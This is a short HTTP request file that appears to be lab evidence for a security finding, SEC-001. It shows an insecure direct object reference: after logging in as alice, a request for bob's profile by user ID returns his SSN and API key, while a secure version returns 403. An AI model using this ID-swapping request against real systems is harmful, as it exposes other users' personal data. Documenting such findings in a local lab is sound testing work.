### SEC-001 evidence — IDOR user profile (lab mode)

# 1) Login as alice
POST http://127.0.0.1:8000/api/login
Content-Type: application/json

{
  "username": "alice",
  "password": "password123"
}

# 2) Access bob's profile with alice token (replace TOKEN)
GET http://127.0.0.1:8000/api/users/2
Authorization: Bearer TOKEN

# Expected (lab): 200 with bob + ssn/api_key
# Expected (secure): 403
